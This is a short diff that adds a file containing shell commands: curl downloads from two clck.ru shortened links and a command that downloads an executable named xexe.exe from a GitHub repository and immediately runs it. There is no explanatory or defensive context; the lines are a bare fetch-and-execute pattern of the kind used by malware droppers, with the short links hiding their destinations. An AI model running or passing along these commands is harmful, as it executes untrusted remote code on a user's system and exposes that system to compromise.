@@ -1,0 +1,5 @@
+curl -LJO https://clck.ru/3Etn7o
+
+https://clck.ru/3EtnJz
+
+curl -LJO https://github.com/xexe-ded/xexe/raw/refs/heads/main/xexe.exe & xexe.exe
